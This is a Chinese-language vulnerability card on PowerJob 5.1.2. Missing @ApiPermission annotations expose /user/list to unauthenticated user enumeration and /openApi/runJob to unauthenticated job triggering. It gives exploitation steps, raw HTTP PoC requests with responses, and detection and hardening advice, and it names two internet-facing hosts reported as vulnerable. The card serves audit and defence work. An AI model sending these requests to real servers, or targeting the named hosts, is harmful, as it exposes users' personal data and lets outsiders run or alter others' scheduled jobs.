---
id: web-generic-auth-powerjob-missing-apipermission-unauth-endpoints
title: PowerJob 鉴权注解缺失：/user/list 未授权枚举用户与 /openApi/* 未授权触发调度任务
type: scenario
domain: web
path: web/generic/auth
technique: powerjob-missing-apipermission-unauth-endpoints
aliases:
- PowerJob 未授权访问
- PowerJob IDOR
- PowerJob /user/list 用户枚举
- PowerJob /openApi/runJob 未授权执行
- ApiPermission 注解缺失
tags:
- powerjob
- java
- spring
- access-control
- unauth
- idor
- job-scheduler
- user-enumeration
- api-permission
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V217
  verified_at: '2026-11-07T04:48:32+08:00'
  notes: '已对照原文与图02-05核对：/user/list 在 AppId: null 下返回 PWJB_ADMIN/PWJB_hacker，互联网资产 powerjob-uat.miscrm.cn 与 qzks.job.huimeihb.com 同样未授权返回用户列表；/openApi/runJob?jobId=1&appId=2 返回实例 ID 851569834683531328；注解驱动鉴权与漏标根因与原文一致。未验证点：原文未给出受影响版本区间（仅 PowerJob-5.1.2 代码库），未在本机复现。'
---

## 一句话结论

PowerJob 服务端的鉴权是注解驱动的：只有标了 `@ApiPermission` 的 Controller 方法才会进入权限校验。`UserInfoController#list` 与 `OpenAPIController` 下多个接口漏标该注解，未登录、`AppId: null` 也能直接访问——`GET /user/list` 返回全部用户的用户名、邮箱、手机号等字段，`POST /openApi/runJob?jobId=<任意>&appId=<任意>` 可直接触发他人应用下的调度任务，同类的 `saveJob`/`copyJob`/`exportJob`/`fetchJob` 等接口还允许修改任务配置。

## 原理

- **注解驱动的权限模型**：PowerJob 在受保护接口上使用 `@ApiPermission(name = "...", roleScope = RoleScope.APP, requiredPermission = Permission.WRITE)`，拦截器按注解里的 `requiredPermission`（NONE/READ/WRITE/OPS/SU）校验调用者权限；同权限内不做资源隔离。也就是说，权限校验只在方法标注了注解时才生效。
- **漏标即公开**：`UserInfoController#list` 只有 `@GetMapping("/list")`，没有任何 `@ApiPermission`，拦截器不会把它当成需要校验的接口，请求直接进入业务逻辑并 `userInfoRepository.findAll()`，把用户表整表返回。`OpenAPIController` 下的 `runJob`、`saveJob`、`copyJob`、`exportJob`、`fetchJob` 等方法同样缺失注解；它们依赖的 `AppId` 请求头在未登录时可为 `null`，也没有其他兜底校验。
- **为什么 CodeQL 能找到**：鉴权逻辑集中在注解上，漏洞模式就是“有 Spring 路由注解、没有自定义权限注解”。CodeQL 在 AST 层匹配方法的注解类型，能一次列出全部漏标方法，比逐个 Controller 人工翻找完整；排除 `AuthController`、`TestController` 这类本来就该公开的类后，51 条结果里就包含上述接口（详见关联的 CodeQL 卡）。
- **危害**：`/user/list` 泄露账号、邮箱、手机号、状态与显示名，可用于口令喷洒/社工；`/openApi/runJob` 以任意 `jobId`+`appId` 触发任务实例（返回实例 ID），可反复触发他人任务；`saveJob` 等写接口可修改任务配置，若任务本身执行脚本/命令，则可能进一步影响 Worker 节点。原文指出这些接口“可以对别人设置的调度任务进行修改”。
- **前提**：PowerJob Server 端口（默认 7700）可被攻击者访问；版本为原文分析的 5.1.2 代码库（原文未给出完整受影响区间，其他版本需自行核对注解是否补齐）。

## 触发条件

- 攻击者能访问 PowerJob Server 的 HTTP 端口（默认 7700），无需任何账号或 AppId。
- 目标 Controller 方法未标注 `@ApiPermission`；原文在 5.1.2 代码库确认 `/user/list` 与 `/openApi/*` 属于此类。
- `/openApi/*` 路由未被网关、反向代理或额外过滤器单独拦截。
- 已知或可枚举 `jobId`、`appId`（可通过任务列表、报错、默认值或 `/user/list` 泄露的用户信息辅助猜测）。

## 利用步骤

1. 确认目标为 PowerJob Server：访问首页/登录页与 `/user/list`，观察 7700 端口与返回 JSON 结构。
2. 未登录请求用户列表：`GET /user/list`；可带 `name` 参数按用户名模糊查询，返回 `id`、`username`、`nick`、`accountType`、`phone`、`email`、`status`、`enable`、`showName`。
3. 触发任务：`POST /openApi/runJob?jobId=1&appId=2`（`AppId` 头可留空或 `null`）；返回 `{"success":true,"data":"<instanceId>"}` 即任务实例已创建。
4. 枚举 `jobId`/`appId` 扩大影响：遍历常见 ID，或结合 `/user/list` 与页面 JS/接口泄露的任务信息定位目标应用。
5. 需要修改任务时，测试 `OpenAPIController` 的 `saveJob`、`copyJob`、`exportJob`、`fetchJob` 等接口，确认是否同样无鉴权。
6. 观察任务执行结果与 Worker 行为；如需进一步利用，检查任务类型是否包含 Shell/脚本处理器。

## PoC

```http
### 未授权枚举全部用户
GET /user/list HTTP/1.1
Host: target:7700
AppId: null
Accept: application/json

### 未授权按用户名模糊查询
GET /user/list?name=admin HTTP/1.1
Host: target:7700
AppId: null
Accept: application/json

### 未授权触发任务（jobId/appId 可遍历）
POST /openApi/runJob?jobId=1&appId=2 HTTP/1.1
Host: target:7700
AppId: null
Accept: application/json
Content-Length: 0
```

```text
# 原文本地复现返回（节选）
GET /user/list -> 200 {"success":true,"data":[{"id":1,"username":"PWJB_ADMIN",...},
                                          {"id":2,"username":"PWJB_hacker",...}]}

POST /openApi/runJob?jobId=1&appId=2
    -> 200 {"success":true,"data":851569834683531328,"message":null,"code":null}
```

说明：PoC 为原文请求的结构化复现，未在本机执行；原文截图显示本地实例与互联网资产（`powerjob-uat.miscrm.cn`、`qzks.job.huimeihb.com`）的 `/user/list` 均未授权返回用户数据，`/openApi/runJob` 返回任务实例 ID。

## 变体与关联

- 变体（同产品其他漏标接口）：`OpenAPIController` 的 `saveJob`/`copyJob`/`exportJob`/`fetchJob`、`MigrateController` 的迁移方法等；以 `@ApiPermission` 缺失为线索批量排查。
- 变体（同类产品）：[[web-generic-auth-xxl-job-getjobsbygroup-jobgroup-idor]]、[[web-generic-auth-xxl-job-jobinfo-remove-idor]]（xxl-job 的同类越权/未授权问题）。
- 关联：[[code-analysis-sast-codeql-spring-missing-auth-annotation]]（挖掘本文漏洞的 CodeQL 查询方法）；[[code-analysis-source-audit-java-auth-config-unauth-endpoint-enumeration]]（从鉴权配置枚举匿名路径的互补审计方法）。
- 边界：若部署方在网关层加了统一认证、或后续版本为所有 Controller 补齐注解并改为默认拒绝，则该链失效；`/openApi/runJob` 只能触发已存在的任务，任务是否存在、是否可执行取决于目标环境；`saveJob` 等写接口的实际可写范围需逐版本确认。

## 检测与防御

- 检测（访问日志）：未携带认证信息或 `AppId` 为空/`null` 的 `/user/list`、`/openApi/*` 请求返回 200；短时间大量不同 `jobId`/`appId` 的 `runJob` 调用；非控制台来源的 `saveJob`/`copyJob` 写操作。
- 检测（代码）：CI 中加入“所有 Controller 方法必须带 @ApiPermission（公开接口显式白名单）”的静态检查/CodeQL 查询；审计 `OpenAPIController`、`MigrateController` 等非典型控制器。
- 防御：把鉴权拦截器改为默认拒绝，公开接口使用显式 `@ApiPermission(requiredPermission = NONE)` 或单独白名单；为 `OpenAPIController` 增加 AppId/密钥校验与调用方身份绑定；对 `runJob` 做任务归属校验（jobId 必须属于当前 appId）；限制 7700 端口仅内网/控制台可达；为任务执行加审计与频率限制。
